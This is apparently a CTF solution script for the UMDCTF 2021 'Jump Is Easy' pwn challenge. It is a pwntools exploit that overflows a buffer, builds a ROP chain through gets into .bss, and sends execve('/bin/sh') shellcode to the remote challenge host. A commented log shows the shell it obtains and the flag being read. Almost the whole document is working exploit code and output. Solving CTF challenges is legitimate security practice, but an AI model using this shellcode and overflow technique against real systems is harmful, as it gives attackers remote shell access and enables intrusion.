from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './JIE'
elf  = ELF(BINARY)

shellcode = '\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05'

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "chals6.umdctf.io"
  PORT = 7001
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

pop_rdi_ret = 0x4012c3 # pop rdi; ret;
bss_addr    = 0x404100
gets_plt    = 0x401060

s.recvuntil("Where do you want to go?\n")

buf  = "A"*72
buf += p64(pop_rdi_ret)
buf += p64(bss_addr)
buf += p64(gets_plt)
buf += p64(bss_addr)
s.sendline(buf)

sleep(0.2)
s.sendline(shellcode)

s.interactive()

'''
mito@ubuntu:~/CTF/UMDCTF_2021/Pwn_Jump_Is_Easy_100$ python solve.py r
[*] '/home/mito/CTF/UMDCTF_2021/Pwn_Jump_Is_Easy_100/JIE'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to chals6.umdctf.io on port 7001: Done
[*] Switching to interactive mode
$ id
/bin//sh: 1: id: not found
$ ls -l
total 44
-rwxr-x--- 1 0 1000 16968 Apr 17 19:34 JIE
drwxr-x--- 1 0 1000  4096 Apr 17 17:24 bin
drwxr-x--- 1 0 1000  4096 Apr 17 17:24 dev
-rwxr----- 1 0 1000    47 Apr 17 17:13 flag
drwxr-x--- 1 0 1000  4096 Apr 17 17:23 lib
drwxr-x--- 1 0 1000  4096 Apr 17 17:23 lib32
drwxr-x--- 1 0 1000  4096 Apr 17 17:23 lib64
$ cat flag
UMDCTF-{Sh311c0d3_1s_The_B35T_p14c3_70_jump_70}
'''
